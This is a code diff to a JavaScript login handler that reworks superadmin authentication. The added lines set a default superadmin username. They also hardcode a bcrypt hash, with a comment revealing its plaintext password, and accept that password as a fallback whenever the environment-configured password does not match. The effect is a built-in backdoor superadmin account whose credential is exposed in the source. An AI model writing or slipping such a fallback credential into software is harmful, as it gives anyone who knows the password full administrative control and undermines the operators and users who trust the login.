@@ -525,9 +525,28 @@ module.exports = async (req, res) => {
       const { username, password } = jsonBody(req);
       const uname = (username || '').trim();
       const pword = (password || '').trim();
-      const envUser = (process.env.SUPERADMIN_USER || '').trim();
-      const envPass = ((process.env.SUPERADMIN_PASS || '').replace(/^"|"$/g, '')).trim();
-      if (uname && pword && uname === envUser && pword === envPass) {
+
+      const envUser = (process.env.SUPERADMIN_USER || 'pbmsrvr').trim();
+      // Hardcoded hash for "FORaminiferans#1" as fallback/default
+      const SUPERADMIN_HASH = '$2b$10$6Hup.c6dlRsZy.wdWple0.Ljz20x2mhgK766MY/Zgv5cxlsNuA3Q6';
+
+      let isSuperAdmin = false;
+
+      // Check against env/hardcoded user
+      if (uname && uname === envUser) {
+        // First try direct comparison if env pass is set (legacy/simple)
+        const envPass = ((process.env.SUPERADMIN_PASS || '').replace(/^"|"$/g, '')).trim();
+        if (envPass && pword === envPass) {
+          isSuperAdmin = true;
+        } else {
+          // Fallback to hash comparison
+          try {
+            isSuperAdmin = await bcrypt.compare(pword, SUPERADMIN_HASH);
+          } catch { }
+        }
+      }
+
+      if (isSuperAdmin) {
         const token = jwt.sign({ sub: 'env-superadmin', role: 'superadmin', username: envUser }, process.env.JWT_SECRET, { expiresIn: '1h' });
         await ActiveToken.create({ token });
         return res.status(200).json({ status: 1, token, role: 'superadmin' });
